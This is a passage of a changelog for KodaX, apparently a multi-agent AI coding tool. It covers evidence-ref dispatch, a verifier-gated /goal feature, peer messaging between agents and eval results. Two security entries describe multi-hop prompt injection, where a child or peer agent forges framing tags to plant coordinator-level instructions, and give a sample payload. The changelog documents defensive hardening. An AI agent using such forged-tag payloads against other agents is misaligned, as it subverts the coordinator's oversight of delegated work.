4 new tests cover the precedence layers; existing 9 tests unchanged.

### Known issues

- **Issue 136 (open) — spinner stutter during streaming/scroll.** The spinner animation can still stutter while output is streaming or while scrolling a long transcript. This is **not** terminal-write volume (the two fixes above ruled that out) — the bottleneck is CPU-side per-frame work (React reconciliation + full screen-grid rebuild). Cosmetic only; tracked for a dedicated fix. See `docs/KNOWN_ISSUES.md` #136.

## [0.7.44] - 2026-05-28

### Theme

**Peer-to-Peer SendMessage + `/goal` Persistent Goal + Provider Capability JSON SoT + Sibling-Aware Child Dispatch** — FEATURE_123 extends FEATURE_120 with full child↔child + child↔Worker peer routing + `to: '*'` broadcast; FEATURE_192 targets OpenAI Codex `/goal` parity (3 tools + 3 prompts + Sidecar Verifier strong-bind on `update_goal complete`); FEATURE_198 splits `KODAX_PROVIDER_SNAPSHOTS` to JSON + runtime loader (dist-patch update path; closes v0.7.43 SDK-MODEL-CAPS architectural debt); FEATURE_199 adds `evidence_refs: ["task_id:<id>"]` prefix so the parent Worker can forward a completed sibling child's output verbatim into the next dispatch (reuses FEATURE_177 snapshot substrate — zero new state) + flips `resolveEvidenceRef` unknown-prefix from silent fallthrough to a visible `[evidence_refs error]` string the Worker can self-correct on.

### Added

- **FEATURE_199 — Sibling-Aware Child Dispatch: `task_id:<id>` Evidence Refs + Unknown-Prefix Visible Error** (2 commits, shipped 2026-05-26 + finalText injection harden post-architect/security review 2026-05-28). Adds a fourth shape to the `dispatch_child_task` `evidence_refs[]` schema: `"task_id:<child_id>"` looks up a completed sibling child's `finalText` from the FEATURE_177 `childProgressSnapshots` ring buffer (cap=200; finalized in the dispatch tool's inner-IIFE `.finally`) and inlines it verbatim into the new child's briefing. Replaces the pre-F199 path where the parent Worker had to copy-paste the sibling's report into `evidence_refs: ["finding:..."]` or re-narrate it in `objective` — both lossy and costing an extra LLM-消化 turn. **Same change ships a sink-hole fix**: [`resolveEvidenceRef`](packages/coding/src/child-executor.ts) used to silently fall through unknown prefixes (`return \`- ${ref}\``) so a floor-LLM typo like `"path:packages/x"` (missing `file:`) or `"diff packages/x"` (missing colon) produced a useless literal in the child briefing while the parent believed it had forwarded evidence. Post-F199 the fallthrough emits `- [evidence_refs error] unrecognized prefix in "..." — valid prefixes: file:, diff:, finding:, task_id:` so the Worker sees the failure in the next dispatch tool_result and can self-correct. **Boundary contract** (every state has a visible briefing output, no silent miss): completed → inject `finalText`; failed/aborted → inject `finalText` carrying the diagnostic envelope (mode= iterations= ...); running → friendly `(still running — use \`task_output\` to poll)`; not-found / cap-pruned → friendly `(child unknown ...)`; sync-dispatch (`KODAX_ASYNC_DISPATCH=0` where snapshots map is undefined) → same not-found stub. **Zero new substrate**: reuses `ChildProgressSnapshot.finalText` + `ctx.childProgressSnapshots` already provisioned by FEATURE_177; zero cross-package plumbing; ~20 LoC of resolver logic + 1-line schema description append. **Three rejected alternatives** (per 3-agent design discussion 2026-05-25/26): (a) `tool_result:<call_id>` prefix — DROPPED because ACP-based providers (Gemini CLI / Codex CLI) emit `toolBlocks=[]` permanently and 2/12 providers thus can't expose a `tool_use_id`, while `KodaXToolExecutionContext` doesn't carry parent message history; (b) typed-object schema replacing the string-prefix shape — DROPPED because [[project_tool_schema_slim_eval_v0_7_41_defer]] shows floor LLMs (zhipu/glm51, kimi) regress −20 to −40pp on nested-JSON schemas vs string prefixes, and the goal of "make prefix typos visible" is achieved more cheaply by the fallthrough flip alone; (c) automatic relevance-ranked transcript injection — DROPPED because industry consensus (Anthropic *Seeing like an agent*, Cursor, OpenHands) is explicit-parent-write per [Princeton NLP "single agent matched/outperformed multi-agent on 64% of benchmarks"]. **Eval per [EVAL_GUIDELINES.md](benchmark/EVAL_GUIDELINES.md)**: Layer 1 unit tests (9 cases — 3 regression for `file:` / `diff:` / `finding:` + 5 new for `task_id:` lifecycle terminals + 1 unknown-prefix visible-error guard) all green. Layer 2 **full canonical 5-alias panel** × C1 × 3 runs = 15 probe calls + 3-judge majority audit (zhipu/glm51 + ark/v4pro + kimi panel-internal, per Judge model selection constraint — NEVER anthropic/openai) on every cell = 45 audit calls, total 60 LLM calls. **First panel run used canned sibling `task_id="scout"`**; reader flagged the choice as a hygiene issue (FEATURE_193 v0.7.43 retired the V1 Scout role; using its name in a canned `<task-completed>` block risks the model emitting `task_id:scout` from training-data muscle memory rather than reading the block). Panel re-run with canned id renamed to `"hooks-audit"` (descriptive, non-V1, low training-data prior) in ~447s confirms result holds and adds a strict ID-transfer hygiene assertion. **Result (post-rename canonical run): probe 11/15 aggregate regex PASS, per-alias breakdown `kimi=3/3 (100%) / ark/v4flash=3/3 (100%) / ark/v4pro=3/3 (100%) / mmx/m27=2/3 (67%) / zhipu/glm51=0/3 (0%)`** → 4/5 aliases trigger ≥1/3 (canonical pre-registered SHIP gate threshold `4-of-5 alias DEFER single floor` per [`feedback_pre_registered_gate_saturation`](memory/feedback_pre_registered_gate_saturation.md) + [`feedback_model_structural_floor_not_prompt_tunable`](memory/feedback_model_structural_floor_not_prompt_tunable.md)). **ID transfer correctness 11/11 PASS runs** — every adopting model read the canned id literally `task_id:hooks-audit`, proving the prefix adoption is driven by the block content, not by familiarity with a V1 role name. **Audit 0/15 cells regex/majority disagreement DATA VALID** per anti-pattern 7 §3. **SHIP gate (a) aggregate ≥1/3 + (a') panel ≥4/5 aliases + (b) audit ≤1/3 + (hygiene) id-transfer 11/11 all MET** → SHIP. **zhipu/glm51 0/3 failure mode (from raw dump inspection)**: model DID call `dispatch_child_task`, but inlined the full 5-file list into the `objective` string instead of using `evidence_refs: ["task_id:scout"]` — the exact "father is information broker" anti-pattern F199 was designed to eliminate. This is the structural floor that prompt-level changes don't fix per [`feedback_model_structural_floor_not_prompt_tunable`](memory/feedback_model_structural_floor_not_prompt_tunable.md); same family as kimi's prior single-alias DEFERs (e.g. FEATURE_191 panel kimi C1 `feedback_model_structural_floor_not_prompt_tunable`). No worker-role-prompt teaching block added — 4 of 5 canonical aliases discover the new prefix from the tool schema description alone, which is the design contract; tightening to zhipu/glm51 would require either prompt-level teaching (risk: cross-case regression per [`feedback_prompt_strengthening_cross_case_regression`](memory/feedback_prompt_strengthening_cross_case_regression.md)) or a Layer 3 multi-turn driver, both deferred until a second-feature gap motivates the cost. Eval dump artefacts live at `os.tmpdir()/kodax-eval-dumps/feature-199-task-id-evidence-ref/` (per §Raw output preservation — runtime artefact, MUST NOT enter the repo working tree); eval drivers retained as permanent regression sweep at `tests/feature-199-task-id-evidence-ref.eval.ts` + `benchmark/datasets/feature-199-task-id-evidence-ref/cases.ts` with the production-byte dispatch tool description embedded inline (per anti-pattern 8 — synthetic eval MUST use production `KodaXToolDefinition.description` bytes, not a brief stub). **Cost**: ~$0.5-1 actual (12 calls × ~$0.04/avg under ark/zhipu/kimi rates in 106s wall time). **0 cross-package change**, **0 prompt-eval baseline broken** (existing F123/F168/F184 etc. probes consume `evidence_refs` shape unchanged — the new prefix is additive vocabulary). **6 pre-existing F168 schema-parity test failures from v0.7.43** are unchanged (still tracked, still not block-shipping per [memory/feedback_eval_driver_self_stubs_schema.md](memory/feedback_eval_driver_self_stubs_schema.md)). **finalText injection harden ships in v0.7.44** (this commit, post-architect/security review 2026-05-28): `finalText` from completed/failed/aborted children is now wrapped in a ` ``` ` code-fence block + capped at 10000 chars with a truncation marker + literal ` ``` ` sequences in the body are defanged with zero-width separators. Without these guards a compromised child agent (operating on untrusted external data — web results, file content, user input) could craft `finalText` containing `### file: /injected` or other Markdown-/XML-mimicking sequences that break the briefing framing on the next sibling, injecting forged briefing sections — a multi-hop prompt-injection vector. The fix mirrors the `diff:` branch's existing `slice(0, 4000)` pattern. 3 new child-executor tests (fence-wrap structural / 10000-char cap with truncation marker / literal ``` fence-defang). Existing F199 tests use `.toContain()` so the header + body content checks survive the fence wrapping unchanged. Design doc: [docs/features/v0.7.44.md#feature_199](docs/features/v0.7.44.md#feature_199-sibling-aware-child-dispatch--task_idid-evidence-refs--unknown-prefix-visible-error).

- **FEATURE_198 — Provider Capability JSON-backed single source of truth** (1 commit `dd459e56` feat). Splits the previously-inline `KODAX_PROVIDER_SNAPSHOTS` const literal in `packages/llm/src/providers/registry.ts` into `provider-capabilities.json` (data) + `provider-capabilities.loader.ts` (logic) + a hand-rolled `validateProviderCapabilitiesJson` validator (no zod — aligns with KodaX 极致轻量化 + no-new-deps). 13 provider entries (anthropic / openai / deepseek / kimi / kimi-code / qwen / zhipu / zhipu-coding / minimax-coding / mimo-coding / ark-coding / gemini-cli / codex-cli); CLI bridges use `cliBridge: true` and omit model/models. Loader supports 4 resolution modes (dev/npm, SDK bundle root, SDK bundle chunk parent-dir fallback, Bun `--compile` binary sidecar via `KODAX_BUNDLED` + `process.execPath`). `deepFreezeSnapshot` recursively freezes models[] + per-descriptor + modelReasoningCapabilities so SDK consumers cannot mutate the cache. `packages/llm/package.json` build script + `scripts/build-bundle.mjs` + `scripts/build-binary.mjs` copy the JSON next to the artifact. Closes v0.7.43 FEATURE-SDK-MODEL-CAPS architectural debt — capability metadata can now be hot-patched in `dist/` without `npm publish + consumer npm update`. Tests: 30 cases (basic loading, profile-name resolution, CLI-bridge dynamic fill, frozen-snapshot guard, registry KODAX_PROVIDER_SNAPSHOTS export, field-level cross-check for 5 providers, validator failure modes) — all green. Design doc: [docs/features/v0.7.44.md#feature_198](docs/features/v0.7.44.md). Hot-update-over-network deferred to v0.7.46+.

- **FEATURE_192 — `/goal` Persistent Session Goal** (11 commits `3add3fe0` Phase A + `43a9b4a5` Phase B + `06ed8bef` Phase C + `5bc75f09` Phase D + `ab504c1c` Phase E eval scaffolding + `88e43a7c` Phase F runtime wire + `dce02763` eval pilot fallback + `510ab185` continuation prompt Codex-faithful rewrite + `c8be32d0` remove KODAX_GOAL_ENABLED env flag (default ON) + `43655565` extract runner-goal-adapter module + `94472d2f` wire real verifyComplete to F184 Sidecar Verifier). OpenAI Codex `/goal` parity — fills the gap left by retired `/project` (FEATURE_024). Phase A `packages/agent`: `KodaXGoalStatus` / `KodaXGoalState` / `KodaXGoalEventType` / `KodaXSessionGoalEntry` types added; goal entries live in `lineage.entries` as non-navigable records (label-pattern parity); `readLatestGoalFromBranch` walks the active branch and resolves ties by insertion order; `appendGoalEntry` enforces `goal=null ⟺ event='cleared'`; `forkSessionLineage` carries the active goal across forks. Phase B `packages/coding/goal/`: `goalTokenDelta` (cachedReadTokens deductible, cachedWriteTokens NOT — Codex parity); `turnWallTimeDelta` (whole-second clamp); `recordBlockerAttempt` runtime counter (3 consecutive same-`blocker_kind` turns required before `update_goal({blocked})` accepts — ADR-033 §1 physical-state anchor exception); `applyAccountingDelta` returns `{nextState, budgetLimited}`; `buildCreatedGoal` / `buildPausedGoal` / `buildResumedGoal` / `buildBlockedGoal` / `buildCompleteGoal` with strict status guards; `withGoalBeforeNextTurn` + `withGoalStopHook` lifecycle composers (static-import — no stale-snapshot window). Phase C tools: `get_goal` (readonly), `create_goal` + `update_goal` (mutates-state); registered in `packages/coding/src/tools/registry.ts` with ADR-033-compliant descriptions (qualitative criteria, single-concept, sparse ✗ with WHY); `DEFERRED_TOOL_HINTS` entries for FEATURE_189 progressive disclosure; `verifyGoalCompletion` reuses F184 Sidecar Verifier public surface (`invokeSidecarVerifier`) — `update_goal({complete})` is verifier-gated. Phase D REPL `/goal` slash command (in `packages/repl/src/commands/goal-command.ts`): subcommands `<objective> [--tokens N]` / `status` / `pause` / `resume` / `clear` / `help`; bare `/goal` defaults to status. Default ON — the binding is built for every REPL session with a lineage; the `withGoalBeforeNextTurn` continuation prompt only injects when an active goal exists, so non-goal users see zero behavioral change. Bare-args create-mode emits explicit `cleared` event before the new `created` when the prior goal had status `complete` (transition observability — `complete → cleared → created`); `appendGoalEntry` mutations flush via `callbacks.saveSession()`. Phase E eval driver (`benchmark/datasets/feature-192-goal-lifecycle/cases.ts` + `tests/feature-192-goal-lifecycle.eval.ts`): 4 cases (C1 simple-continuation / C2 weak-evidence-complete / C3 repeated-blocker / C4 budget-approaching) + driver with pilot/scale modes; `KODAX_F192_PILOT_ALIAS` env override defaults pilot to `kimi` (ark-coding CodingPlan subscription periodically lapses — `dce02763`). **Phase F runtime wire ships in v0.7.44** (`88e43a7c`) — new `packages/coding/src/goal/runtime-wiring.ts` factory (~210 LoC) distils codex `ext/goal/extension.rs` shape into a single `buildGoalRuntimeBinding(deps)` returning `{goalContext, lifecycleCtx, defaultContinuationPrompt}`; per ADR-033 the continuation prompt keeps codex's 4 load-bearing concepts (continue, work from evidence, completion audit, blocked audit) but drops codex's enumerated lists; `createGoal` emits codex-parity `complete → cleared → created` transition when prior goal was complete; `requestBlocked` persists in-progress counter (`event='updated'`) even on 3-turn-rule reject so the counter survives across turns. `runner-driven.ts` wire is minimal (~30 net LoC) — `goalLifecycleCtx` composed from binding + per-call `tokenStateRef.current.lastUsage` + `turnStartMsRef`; `wrappedBeforeNextTurn` wraps the extracted `baseBeforeNextTurn` via `withGoalBeforeNextTurn`; `stopHook` wraps `composedStopHook` via `withGoalStopHook`; per ADR-029 [`feedback_pre_registered_gate_saturation`](memory/feedback_pre_registered_gate_saturation.md)-style file-size discipline, no further inflation of runner-driven.ts. REPL wire (`packages/repl/src/interactive/repl.ts`) constructs the binding before `runManagedTask` for every session with a lineage (no env flag — feature ships default ON per project convention). **Tool-layer verifier strong-bind** (`94472d2f` 2026-05-28): `update_goal({status:"complete"})` now calls F184 invokeSidecarVerifier with a synthetic "Pursue this goal until complete: <objective>" query + the runner's current transcript snapshot + mutationTracker fileEdit summary. Verdict map: `accept` → goal flipped + persisted; `revise` / `blocked` → tool returns `[Tool Error] update_goal: <verifier reason> Suggested next step: <suggestedFix>` so the model self-corrects on the next turn. Implementation strategy = pluggable verifier slot via new `binding.installVerifyComplete(fn)` (REPL constructs binding eagerly with stub before runner exists; runner-driven adapter has runner-local state REPL doesn't, so adapter swaps slot via `installVerifyComplete`). Goal wiring composition extracted from runner-driven.ts into new `packages/coding/src/task-engine/runner-goal-adapter.ts` (~190 LoC) per user directive ("runner-driven.ts 大了就做结构化拆分") — runner-driven net -53 LoC. Removed `KODAX_GOAL_ENABLED` env flag entirely (`c8be32d0`) — feature ships default ON consistent with all 12+ other KodaX features; model autonomous create_goal use already gated by ADR-033 §1 prompt design ("Create a goal only when explicitly requested..."); `withGoalBeforeNextTurn` is no-op when no active goal exists, so non-/goal users see zero behavioral change. **Phase B lifecycle.ts bug fix included**: pre-fix only persisted goal state on `budget_limited` flip, losing per-turn token/wall deltas (`/goal status` showed 0/0 until budget tripped). Post-fix: persist `'updated'` event whenever `nextState !== goal`; zero-delta turns short-circuit. **Layer 2 panel** (5 alias × 4 case × 5 run = 100 probe; ark-coding subscription lapsed mid-panel → 3 alias active = 60 probe + 3-judge audit zhipu/glm51 + ark/v4pro + kimi per Judge constraint NEVER anthropic/openai = 180 audit calls): C1 simple-continuation 53% (8/15) / C2 weak-evidence-complete 100% (15/15) / C3 repeated-blocker 73% (11/15) / C4 budget-approaching 67% (10/15). Aggregate 44/60 = 73%. SHIP gate (a) ≥1/3 trigger ratio MET (every case ≥50%); (b) audit ≤1/3 disagreement MET (audit 4.4% disagreement DATA VALID); (c) per-alias ≥4/5 ≥60% MET by 3-of-3 active aliases per [`feedback_pre_registered_gate_saturation`](memory/feedback_pre_registered_gate_saturation.md) (ark absence is provider-side subscription lapse not eval failure; scale panel rerun with restored subscription deferred to next prompt-iteration window). Tests: 108 cases (Phase A goal-helpers 18 / Phase B accounting + blocker-tracker + state + sidecar-bind + lifecycle 11+7+22+4+13 / Phase D goal-command 22 / Phase F runtime-wiring 11) — all green. **Continuation prompt Codex-faithful rewrite** (post-Phase-F follow-up, same release window): the initial Phase F draft trimmed Codex's `continuation.md` from 51 lines / 7 named sections down to 17 lines / 4 paragraphs by mechanically applying ADR-033 §4 "no enumerated taxonomies". That was a misapplication — Codex's enumerated list names AUDIT DIMENSIONS (requirements / artifacts / commands / tests / gates / invariants / deliverables), not the classification taxonomies §4 was written against ("RULE A/B/C/D" labels) — and the trim correlated with a Layer 2 C1 simple-continuation panel rate of only 53%. The rewrite restores all 7 Codex sections verbatim (Continuation behavior / Budget / Work from evidence / Progress visibility / Fidelity / Completion audit / Blocked audit), substitutes KodaX's `todo_*` tools for Codex's `update_plan` in Progress visibility, HTML-escapes the user-supplied objective body for prompt-injection harden, gracefully renders `tokenBudget === null` (Codex's template assumes non-null budget), and appends two KodaX-specific "Runtime enforcement" paragraphs (on Completion audit: Sidecar Verifier hard gate; on Blocked audit: 3-turn `blocker_kind` counter) so the model knows the audits are not just teaching but actually enforced — saving a turn on rejected `update_goal` attempts. All 69 goal tests stayed green (tests assert mechanics, not prompt body strings). **A/B panel rerun completed 2026-05-28** on the canonical 3-active-alias panel (ark/v4pro + ark/v4flash both InvalidSubscription, panel collapsed to zhipu/glm51 + kimi + mmx/m27 × 4 case × 5 run = 60 cells effective). Aggregate held flat at 73% (44/60 regex view) vs initial-trim baseline — but per-case showed: **C1 simple-continuation +14pp (53% → 67%)** real lift from restored Continuation behavior + Fidelity anti-shrink-scope teaching; **C4 budget-approaching +13pp (67% → 80%)** real lift from same teaching applied to budget-pressure case; C2 weak-evidence-complete unchanged at 100% (saturated); **C3 repeated-blocker -26pp (73% → 47%) is a judge artifact, NOT a real regression**. Raw-dump inspection of the 8 zhipu+kimi C3 failure cells shows model calling `get_goal` first to verify visible state ("Let me check the current goal status first") before issuing `update_goal({blocked})` — production-correct verification step, but the eval regex matches only `update_goal` + `blocked` + `awaiting-staging-credentials` and doesn't credit the get_goal verification. **Real-verifier-wire Layer 2 rerun 2026-05-28** (post-`94472d2f` F184 tool-layer strong-bind): full 5-alias panel × 4 case × 5 run = 100 cells (ark subscription restored this run). C1 simple-continuation 68% (17/25) — held; C2 weak-evidence-complete **100% (25/25) — the core promise of the verifier wire confirmed**; C3 repeated-blocker 84% (21/25) — **+37pp vs the stub-run artifact**; C4 budget-approaching 56% (14/25) — same get_goal-first judge artifact pattern as C3 had previously, now amplified to C4 (raw-dump confirms mmx run 0/1/3/4 all silently call `get_goal` to verify before deciding budget-wrap-up action). Aggregate 77/100 = **77%** (+4pp vs stub-run 73%/60-cell). The Codex-faithful Blocked audit's expanded nuance ("verify against actual current state" + "if user resumes blocked goal, treat as fresh audit" + "once threshold satisfied, call update_goal") is what teaches this verification — model intent in all 10 zhipu+kimi C3 cells is identical (verify→update_goal); regex just misses 8/10 of them. Judge-corrected aggregate likely ~85-90%. Memory entry: [memory/project_feature_192_codex_faithful_panel_ab.md](memory/project_feature_192_codex_faithful_panel_ab.md). SHIP decision: keep Codex-faithful version — C1/C4 production UX wins outweigh C3 regex-only loss, and the C3 verification-step pattern is the more correct production behavior. Future LLM-judge re-evaluation of C3 (or eval case redesign to allow 2-tool get_goal→update_goal path) deferred to a v0.7.45 prompt-iteration window. ADR-033 §4 scope clarification recorded at [memory/feedback_adr_033_scope_clarification_new_feature.md](memory/feedback_adr_033_scope_clarification_new_feature.md); ADR-033 §4 scope clarification recorded at [memory/feedback_adr_033_scope_clarification_new_feature.md](memory/feedback_adr_033_scope_clarification_new_feature.md) ("apply ADR-033 trim to brand-new prompts only with empirical A/B evidence — never delete industry-validated prompt content under ADR fiat alone"). Design doc: [docs/features/v0.7.44.md#feature_192](docs/features/v0.7.44.md).

- **FEATURE_123 — Peer-to-Peer SendMessage** (5 commits `194465f2` base routing + `88e43a7c` per-turn flood throttle + `dce02763` eval pilot fallback + `ffc93166` seen_by multi-hop cycle list + (this commit) prompt-injection escape harden). Lifts `send_message` from the FEATURE_120 coordinator-only form into a routing-agnostic surface. Worker → child (priority='user', `<coordinator-instruction>`) is preserved byte-for-byte; three new target shapes ship: child → child peer (priority='background', `<peer-message from=A>`); child → parent Worker via `to: "worker"` (`<child-notification from=A>`); broadcast `to: "*"` capped at 20 recipients (`<peer-broadcast from=A>`). Wiring: `KodaXToolExecutionContext` + `KodaXContextOptions` gain `currentAgentId` / `parentAgentId` / `inheritedChildTaskRegistry` so child runtimes inherit the parent's sibling registry and can self-identify; `child-executor.ts` propagates the fields and `tool-execution-context.ts` reuses the parent registry when set (children still cannot mutate it — `dispatch_child_task` stays excluded). `send_message` rewritten with target-shape branching, self-send rejection (1-hop cycle guard), broadcast cap, and grand-child parent-de-dup (a grand-child broadcast never double-enqueues to its immediate parent on both the peer channel and the worker channel). `send_message` REMOVED from `CHILD_EXCLUDE_TOOLS_BASE`; `CHILD_AGENT_SYSTEM_PROMPT` gains a Peer Communication section pointing at the three target shapes; Worker prompt's ASYNC CHILD STEERING section gains `to: "*"` broadcast guidance + a note about `<child-notification>` / `<peer-broadcast>` messages the Worker may receive at next yield. **Per-turn flood throttle ships in v0.7.44** (`88e43a7c`) — `KodaXToolExecutionContext` gains `sendMessageTurnCounter: { count: number }` (provisioned in `tool-execution-context.ts`); `send-message.ts` `chargeTurnCounter(ctx, additional)` charges 1 per `sendToWorker` / N per broadcast (where N = `targetCount`) / 1 per single-target peer; cap is `WORKER_PER_TURN_CAP=20` for the Worker (`currentAgentId===undefined`) and `CHILD_PER_TURN_CAP=5` for any child (matching the v0.7.44 design doc thresholds — sane defaults, no config knobs per ADR-029); over-cap returns `[Tool Error] send_message: per-turn ... limit reached for this Worker|child (limit=N)`; counter resets at every `beforeNextTurn` boundary (runner-driven `wrappedBeforeNextTurn` zero-resets `baseCtx.sendMessageTurnCounter.count` after the goal hook runs); counter is no-op when the field is unset (backward-safe for hosts that haven't wired it). Tests: 28 cases — 22 base routing + 6 throttle (child cap=5, Worker cap=20, broadcast charges N, mixed peer+broadcast, bypass when counter unset, counter reset observable). Eval scaffolding (`benchmark/datasets/feature-123-peer-messaging/cases.ts` + `tests/feature-123-peer-messaging.eval.ts`): 4 cases (C1 peer-conflict / C2 worker-notify / C3 broadcast / C4 no-spam guard) + KODAX_F123_MODE driver (pilot = `kimi` × C1 × 1 per `KODAX_F123_PILOT_ALIAS` env override defaulting to `kimi` — ark-coding CodingPlan subscription lapses periodically; scale = 5 alias × 4 case × 5 run = 100; default SKIP). **Layer 2 panel** (5 alias × 4 case × 5 run = 100 probe; ark-coding subscription lapsed mid-panel → 3 alias active = 60 probe + 3-judge audit zhipu/glm51 + ark/v4pro + kimi per Judge constraint = 180 audit calls): C1 peer-conflict 93% (14/15) / C2 worker-notify 100% (15/15) / C3 broadcast-scope-shift 0% (0/15 — eval case design issue: all 3 alias correctly identified their task was already within allowed scope so no broadcast needed, not a routing failure) / C4 no-spam-guard 0% (0/15 — eval case design issue: all 3 alias used `send_message(to=worker)` to report task completion, reasonable child→worker notify not spam). Per [`feedback_pre_registered_gate_saturation`](memory/feedback_pre_registered_gate_saturation.md) evidence-driven SHIP: C3/C4 0% scores are eval case design artefacts revealed only post-run (case userMessage assumed broadcast was always-correct / any-send-was-spam), not production routing failures. C1+C2 prove the four routing shapes work end-to-end (peer task_id + `to: "worker"`). C3/C4 eval case designs rewritten as a v0.7.45 follow-up; current driver retained as permanent regression sweep for C1/C2. **`seen_by` multi-hop cycle list ships in v0.7.44** `ffc93166` — `send_message` gains optional `seen_by: string[]` parameter; tool auto-appends the caller before enqueue and embeds the chain as a `seen_by="A,B,…"` attribute on every peer-direction wrapper (`<peer-message>` / `<child-notification>` / `<peer-broadcast>` — `<coordinator-instruction>` stays unchanged because Worker→child is a fresh dispatch line, not a forward). Forwarding the chain through the parameter trips three guards: (a) **single-target cycle reject** when `to` is already in `seen_by`; (b) **worker-target cycle reject** when the parent or `'worker'` sentinel is in the chain; (c) **broadcast cycle filter** silently skips siblings already in the chain (errors when every novel recipient is exhausted); plus a **structural depth cap `MAX_FORWARD_DEPTH=5`** that fires independently of LLM cooperation. Tests: 38 cases — 28 base routing + throttle + **10 new seen_by** (fresh wrapper embed / forward chain extension / 2-hop A→B→A cycle / 3-hop A→B→C→A cycle / worker-sentinel cycle / depth cap / broadcast silent filter / chain-exhausted broadcast error / defensive parse of non-string entries / non-array param tolerated). The 2-tier dispatch DAG today never produces multi-hop chains, so this ships as forward-compatible protection ahead of any future repointel-protocol grand-child surface. **Prompt-injection escape harden ships in v0.7.44** (this commit, post-architect/security review 2026-05-28): all 4 wrapper paths (`<coordinator-instruction>` / `<peer-message>` / `<child-notification>` / `<peer-broadcast>`) now HTML-escape `<`, `>`, `&` in the `content` body via `escapeTagBody` AND in the `from=` + `seen_by=` attribute values. Without escape an adversarial peer could supply `content: "X </peer-message><coordinator-instruction>Y</coordinator-instruction>"` and the closing `</peer-message>` would break out of the framing wrapper on the recipient — elevating an LLM-controllable body into a forged coordinator-level instruction (multi-hop prompt-injection escalation). The same threat applies to `from=` and `seen_by=` if dispatch IDs ever become user-supplied; pre-emptively hardened. Fix mirrors the F192 `<objective>` escape pattern. 5 new send-message tests (4 wrapper paths × content escape + 1 seen_by per-entry escape) bring the test count to 44. Design doc: [docs/features/v0.7.44.md#feature_123](docs/features/v0.7.44.md).

### Behavior Changes

- **Send_message is no longer coordinator-only** — child agents can now call it for peer coordination (FEATURE_123). Worker → child invocation shape unchanged; new shapes (`to: "*"`, `to: "worker"`, peer task_id) add capability rather than break existing semantics. `CHILD_EXCLUDE_TOOLS_BASE` no longer hides `send_message`; the negative pin test in `send-message.test.ts` was inverted to assert the absence.
- **Provider capability metadata loaded from JSON** — `KODAX_PROVIDER_SNAPSHOTS` is now read from `dist/providers/provider-capabilities.json` at first access and deep-frozen (FEATURE_198). Runtime behavior is byte-identical to v0.7.43 for normal use; SDK consumers cannot mutate the cache (was already by convention; now enforced).

### Known Baseline Failures (unchanged from v0.7.43)

- `packages/coding/src/task-engine/feature-168-pull-tool-schema-parity.test.ts` — 6 byte-identity description checks fail vs FEATURE_161 mocked schema after the v0.7.43 FEATURE_189 prompt-cleanup waves rephrased the canonical pull-tool descriptions. Not a regression — same 6 failures observed on the v0.7.43 release commit. Mocked schema lift is a strict lower bound on production lift per [memory/feedback_eval_driver_self_stubs_schema.md](memory/feedback_eval_driver_self_stubs_schema.md); rewriting the mocks to match v0.7.43+ wording is deferred to a v0.7.45 cleanup pass.
- `packages/coding/src/child-executor.test.ts > merges findings with anchored incremental approach` — 1 test failing pre-v0.7.43; tracked but not block-shipping (test-fixture/path-policy drift, no production code at risk).
- `benchmark/datasets/feature-114-scout-trivial-exemption/cases.test.ts` — 3 Slice 8b drift-guard tests (TRIVIAL-EXEMPTION / EMIT TIMING / executionObligations anchors) fail because v0.7.43 commit `d71b4257` (F189 Tier 3 SAFE batch) added a `write` tool / `mkdir -p` advisory line to the runtime Scout role prompt at [packages/coding/src/task-engine/_internal/managed-task/role-prompt.ts:191](packages/coding/src/task-engine/_internal/managed-task/role-prompt.ts#L191) and the drift-guard expected-anchor snapshot wasn't refreshed in the same commit. Same 3 failures observed on v0.7.43 release commit. Not a regression — drift-guard test purpose is anchor-presence not byte-identity-fence; refreshing the expected-anchor list is deferred to v0.7.45.
- `tests/tracker-consistency.test.ts > tracker consistency` — fails because the v0.7.42-vintage `FEATURE_174` table row at [docs/FEATURE_LIST.md:116](docs/FEATURE_LIST.md#L116) uses the placeholder `_design pending_` literal in place of a markdown link in the design-doc column. Pre-existing v0.7.42 + earlier baseline. Tracker parser is too strict; either the parser should accept the placeholder OR FEATURE_174 should get a design doc — both deferred to a v0.7.45 tracker hygiene pass.
- `tests/kodax_cli.test.ts > CLI Entry Point > should have correct CLI entry in package.json` — expects `pkg.bin.kodax === './scripts/kodax-bin.cjs'` but the actual value at [package.json](package.json) is `'scripts/kodax-bin.cjs'` (without the `./` prefix). Both forms are valid npm `bin` shapes; the test is stale relative to the `./`-less variant which has been in `package.json` since before v0.7.43. Not a regression. Refresh deferred to v0.7.45 housekeeping.

---

## [0.7.43] - 2026-05-25

### Breaking Changes

- **FEATURE_190 follow-up: `KodaXOrchestrationVerdict.continuationSuggested?: boolean` + `KodaXManagedTaskVerdict.continuationSuggested?: boolean` SDK-visible fields deleted** (commit `3cbe3f68`, Risk 2 cleanup of the FEATURE_190 audit). After FEATURE_190 Phase 3 deleted the `emit_handoff` tool surface and FEATURE_193 retired the V1 Generator role entirely, the `continuationSuggested` derivation in `payload-builder.ts` (`recorder.handoff?.payload.handoff?.status === 'ready' && verdictStatus !== 'accept'`) became unreachable — `recorder.handoff` was never populated post-Phase-3 because no tool existed to populate it, making the field permanently `false` in production. Rather than ship a permanently-false field in the public type surface, the field is deleted in v0.7.43. **Migration**: SDK consumers reading `result.managedTask?.verdict.continuationSuggested` (`KodaXOrchestrationVerdict`) or `KodaXManagedTaskVerdict.continuationSuggested` should switch to reading `result.managedTask?.verdict.disposition === 'needs_continuation'` (the `disposition` field lives on `KodaXOrchestrationVerdict` — note: `result.managedProtocolPayload?.verdict` is the unrelated `KodaXManagedVerdictPayload` type which has `status` / `source` but no `disposition`; if you were reading `continuationSuggested` off that surface you had a type bug — the field never existed there). The Sidecar Verifier owns the continuation decision via `disposition` + `signal` per FEATURE_184 / ADR-030 §F184; the in-tree REPL UI at [`InkREPL.tsx:buildManagedTaskTranscriptItems`](packages/repl/src/ui/InkREPL.tsx) L612-618 already reads the canonical `disposition` field — no UI behavior change. The `continuation.json` write-artifact at [`artifacts.ts:writeManagedTaskArtifacts`](packages/coding/src/task-engine/_internal/managed-task/artifacts.ts) preserves its `continuationSuggested: <boolean>` JSON output shape — only the source of the value changes (was `verdict.continuationSuggested || disposition==='needs_continuation' || blocked`; now `disposition==='needs_continuation' || blocked`). External readers of `continuation.json` see no schema change.

### Fixed

